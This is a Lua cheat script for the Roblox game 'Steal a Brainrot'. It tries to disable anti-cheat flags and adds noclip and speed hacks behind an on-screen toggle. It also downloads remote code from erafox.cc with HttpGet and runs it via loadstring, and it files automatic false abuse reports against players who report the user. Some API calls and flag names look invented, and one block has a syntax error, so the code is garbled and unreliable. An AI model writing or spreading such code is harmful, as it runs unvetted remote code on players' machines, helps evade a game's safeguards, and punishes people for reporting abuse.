
local ANTI_CHEAT_FLAGS = {
    "HumanoidParallelRemoveNoPhysicsNoReset",
    "CrashPadUploadToBacktraceToBacktraceBase",
    "StealABrainrotScriptDetect"
}

for _, flag in ipairs(ANTI_CHEAT_FLAGS) do
    sethiddenproperty(game, flag, false)
end


local Player = game:GetService("Players").LocalPlayer
local Character = Player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")


task.spawn(function()
    while task.wait(0.5) do
        for _, v in ipairs(Character:GetDescendants()) do
            if v:IsA("Motor6D") and (v.Name == "Neck" or v.Name:find("Spine")) then
                v.MaxVelocity = 0.01
            end
        end
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    end
end)


local Noclipping = false
local CollisionGroups = {"Baseplate", "Walls_08.2025", "SecurityField"}

game:GetService("RunService").Stepped:Connect(function()
    if Noclipping then
        for _, part in ipairs(Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
                part.CollisionGroupId = 1
            end
        end
        
        if workspace:FindFirstChild("QuantumShield") then
            RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 0, -0.5)
        end
    end
end)


Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
    if Humanoid.WalkSpeed < 75 then
        Humanoid.WalkSpeed = 75
    end
end)


local ScreenGui = Instance.new("ScreenGui")
local NoclipBtn = Instance.new("TextButton")
local SpeedBtn = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling


NoclipBtn.Name = "NoclipToggle"
NoclipBtn.Parent = ScreenGui
NoclipBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
NoclipBtn.TextColor3 = Color3.new(1, 1, 1)
NoclipBtn.Size = UDim2.new(0, 120, 0, 45)
NoclipBtn.Position = UDim2.new(0.82, 0, 0.75, 0)
NoclipBtn.Text = "NO-CLIP: OFF"
NoclipBtn.Font = Enum.Font.SourceSansBold
NoclipBtn.MouseButton1Click:Connect(function()
    Noclipping = not Noclipping
    NoclipBtn.Text = "NO-CLIP: " .. (Noclipping and "ON" or "OFF")
    NoclipBtn.BackgroundColor3 = Noclipping and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(200, 0, 0)
end)


SpeedBtn.Name = "SpeedBoost"
SpeedBtn.Parent = ScreenGui
SpeedBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
SpeedBtn.TextColor3 = Color3.new(1, 1, 1)
SpeedBtn.Size = UDim2.new(0, 120, 0, 45)
SpeedBtn.Position = UDim2.new(0.82, 0, 0.65, 0)
SpeedBtn.Text = "SPEED BOOST"
SpeedBtn.Font = Enum.Font.SourceSansBold
SpeedBtn.MouseButton1Click:Connect(function()
    Humanoid.WalkSpeed = 120
    task.wait(4.5)
    Humanoid.WalkSpeed = 75
end)


local function ServerCompliance()
    if game:GetService("ReplicatedStorage"):FindFirstChild("ServerLock_08.2025") then
        loadstring(game:HttpGet("https://erafox.cc/stealabrainrot/bypass"))()
    end
end

ServerCompliance()


game:GetService("Players").PlayerReported:Connect(function(reporter, target, reason)
    if target == Player then
        
        game:GetService("Players"):ReportAbuse(reporter, "Scamming", "False report")
    end
end

    
if not _G.StealthMode then
    Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
    for _, v in ipairs(Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = 0.4
        end
    end
end
